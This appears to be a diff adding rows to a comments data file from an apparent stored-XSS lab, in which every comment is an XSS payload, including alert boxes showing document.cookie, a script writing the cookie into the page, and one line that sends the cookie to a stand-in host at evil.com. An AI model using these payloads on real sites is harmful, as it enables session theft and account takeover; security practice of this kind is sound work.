@@ -1,0 +1,6 @@
+comment_id	name	comment
+14	attacker5	<img src="x" onerror="alert('XSS by Shreyashi — Session: ' + document.cookie)">
+15	attacker10	<script>document.write('<h2>Stolen Cookie: ' + document.cookie + '</h2>')</script>
+16	attacker11	<img src="x" onerror="alert('XSS Confirmed — Cookie: ' + document.cookie)">
+17	hacker	<script>alert('Stored XSS')</script>
+18	victim	<script>document.location='http://evil.com/steal?c='+document.cookie</script>
